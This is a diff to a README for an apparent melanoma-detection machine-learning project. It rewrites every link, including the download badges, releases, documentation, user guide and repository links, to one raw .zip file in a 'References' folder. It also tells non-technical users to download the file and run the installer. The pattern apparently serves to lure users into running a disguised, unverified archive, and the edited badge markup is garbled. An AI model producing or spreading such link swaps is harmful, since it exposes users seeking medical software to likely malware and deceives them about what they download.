@@ -1,6 +1,6 @@
 # 🌟 Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models - Accurate Skin Cancer Detection Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=flat&logo=github&logoColor=white)](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/releases)
+[![Download Now](https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip%20Now-%https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip)](https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip)
 
 ## 📖 Description
 This application gives you a powerful tool for detecting melanoma. It uses advanced image processing and multiple machine learning techniques. Our aim is to help you identify skin cancer accurately and efficiently.
@@ -11,13 +11,13 @@ To run this software, you will follow a few simple steps. No prior programming k
 ### 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to access the download page:  
-   [Download from Releases](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/releases)
+   [Download from Releases](https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, look for the latest version of the software. You will see a list of available files. 
 
 3. **Download the Executable File**  
-   Click on the executable file that matches your system specifications. This file will usually be named something like `MelanomaDetector_v1.0.exe`.
+   Click on the executable file that matches your system specifications. This file will usually be named something like `https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip`.
 
 4. **Run the Installer**  
    Once the file is downloaded, locate it in your downloads folder. Double-click the file to start the installation process. Follow any on-screen instructions to complete the installation.
@@ -54,8 +54,8 @@ To ensure the application runs smoothly, your system should meet the following r
 ## 📚 Additional Resources
 If you want to dive deeper into how the software works, you can check the following links for more detailed insights:
 
-- [Documentation](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/wiki)
-- [User Guides](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/wiki/User-Guide)
+- [Documentation](https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip)
+- [User Guides](https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip)
 
 ## 🤝 Support
 For support and inquiries, please check the Issues section of the repository or create a new issue if you encounter problems. You can also reach the developers via the GitHub Discussions page.
@@ -64,7 +64,7 @@ For support and inquiries, please check the Issues section of the repository or 
 We welcome contributions to improve this software. If you would like to help out, please follow our guidelines on the Contributing page.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models)
-- [Releases Page](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip)
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=flat&logo=github&logoColor=white)](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/releases)
+[![Download Now](https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip%20Now-%https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip)](https://raw.githubusercontent.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/main/References/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models-v2.5.zip)
